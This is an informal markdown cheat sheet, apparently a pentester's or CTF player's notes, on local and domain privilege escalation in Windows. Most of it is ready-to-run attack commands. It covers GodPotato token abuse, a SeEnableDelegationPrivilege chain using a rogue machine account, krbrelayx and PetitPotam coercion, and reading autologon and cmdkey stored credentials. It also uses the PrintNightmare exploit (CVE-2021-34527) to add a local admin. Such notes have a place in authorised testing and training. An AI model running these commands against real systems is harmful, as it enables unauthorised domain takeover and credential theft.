# Local Privilege Escalation
## Basic whoami
```powershell
whoami /all
```
Sliver below
```bash
getprivs
```
### SeImpersonatePrivilege
GodPotato that stuff
```bash
git clone https://github.com/BeichenDream/GodPotato
```
Idk how to build that
```bash
wget https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/Token/GodPotato.exe
```
### SeEnableDelegationPrivilege
This allows the user to modify the machines TRUSTED_FOR_DELEGATION privilege
Check Machine account quota (must be 1 or above)
```bash
nxc ldap <ip> -u <user> -p <pass> -M maq
```
Check what is trusted for delegation
```bash
nxc ldap <ip> -u <user> -p <pass> --trusted-for-delegation
```
Make a machine account (that we control)
```bash
impacket-addcomputer -dc-ip <ip> -computer-name <arbitraryName> <domain>/<user>:<passowrd>
```
Add TRUSTED_FOR_DELEGATION to our machine we made
```bash
bloodyAD -u <user> -d <domain> -p <pass> --host <ip> add uac <machineName>$ -f TRUSTED_FOR_DELEGATION
```
Install krbrelayx -> add dns record
```bash
python dnstool.py -u '<domain>\<user>' -p <pass> -r <machine>.<domain> -d <yourIP> --action add <dcIP>
```
From krbrelayx -> add spn
```bash
python addspn.py -u '<domain>\<user>' -p <pass> -s 'cifs/<machin>' -t '<machine>$' -dc-ip <dcIP> <targetIP/dcIP>
```
Wait 180 seconds for DNS to update. Test with following
```bash
dig <addedDNSEntry> @<dcIP>
```
Convert machine password to RC4
```bash
python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest()).decode())'
```
Use krbrelayx to get the incoming connections
```bash
python krbrelayx.py -hashes :<rc4>
```
Coerce the DC into connecting to our added machine | Install petit potam
```bash
git clone https://github.com/topotam/PetitPotam
```
NOW we do the coerscion
```bash
python3 PetitPotam.py -target-ip <ip> -u '<machine>$' -p '<machinePass>' <machine> <dcHostname>
```
You can use the tgt for kerberos auth as the machine account (hopefully) Secrets dump?
## Check Autologon
```bash
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' `-Name DefaultUserName,DefaultPassword,DefaultDomainName | Format-List
```
Look for cmdkeys
```bash
cmdkey /list | ForEach-Object { $_ }
```
## List files in recycle bin
```bash
    foreach ($item in $recycleBin.Items()) {
        Write-Host "Name: $($item.Name)"
        Write-Host "Path: $($item.Path)"
        Write-Host "Deletion Date: $($item.ModifyDate)" # ModifyDate often reflects deletion time in Recycle Bin
        Write-Host "Original Location: $($item.ExtendedProperty("System.Recycle.OriginalLocation"))"
        Write-Host "---"
    }
```
## Print Nightmare
Get the john hammond thing
```bash
git clone https://github.com/JohnHammond/CVE-2021-34527
```
Usage
```powershell
Import-Module .\cve-2021-34527.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default

Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 
```
